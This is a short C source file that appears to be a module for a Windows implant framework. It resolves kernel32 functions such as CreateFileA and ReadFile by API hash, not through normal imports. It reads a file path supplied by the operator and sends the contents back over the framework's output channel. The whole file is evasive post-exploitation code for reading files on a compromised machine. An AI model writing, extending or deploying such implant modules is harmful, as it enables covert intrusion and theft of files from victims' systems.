#include <windows.h>
#include "common.h"


#define HASHED_CreateFileA         0xeb96c5fa
#define HASHED_CloseHandle         0x3870ca07
#define HASHED_ReadFile			   0x71019921
#define OUTPUT_CAT 0x03

typedef HANDLE(WINAPI *pCreateFileA)(LPCSTR lpFile, DWORD Desired, DWORD wShare, LPSECURITY_ATTRIBUTES lpSecAttributes, DWORD dwCreateDispo, DWORD dwFlagAndAttris, HANDLE hTemplates);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hProc);
typedef BOOL(WINAPI *pReadFile)(HANDLE hFile, LPVOID buf, DWORD BytesToRead, LPDWORD BytesRead, LPOVERLAPPED lpOverLapped);


__attribute__((section(".text$B")))
BOOL WINAPI ModuleEntry(pModule api, PVOID ctx, PBYTE args, DWORD ArgLen) {
	HMODULE k32                = api->ModuleGetModule(HASHED_kernel32);
	pCreateFileA fnCreateFileA = (pCreateFileA)api->ModuleGetProc(k32, HASHED_CreateFileA);
	pCloseHandle fnCloseHandle = (pCloseHandle)api->ModuleGetProc(k32, HASHED_CloseHandle);
	pReadFile fnReadFile       = (pReadFile)   api->ModuleGetProc(k32, HASHED_ReadFile);


	HANDLE hProc = NULL;
	CHAR buf[1024];
	DWORD BytesToRead = sizeof(buf) - 1;
	DWORD BytesRead = 0;

	hProc = fnCreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hProc == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	BOOL res = FALSE;
	res = fnReadFile(hProc, buf, BytesToRead, &BytesRead, NULL);

	if(!res) {
		return FALSE;
	}
	buf[BytesRead] = '\0';

	api->ModuleWrite4(ctx, OUTPUT_CAT);
	api->ModuleWrite4(ctx, BytesRead);
	api->ModuleWriteStr(ctx, buf, BytesRead);

	fnCloseHandle(hProc);

	return TRUE;
	

}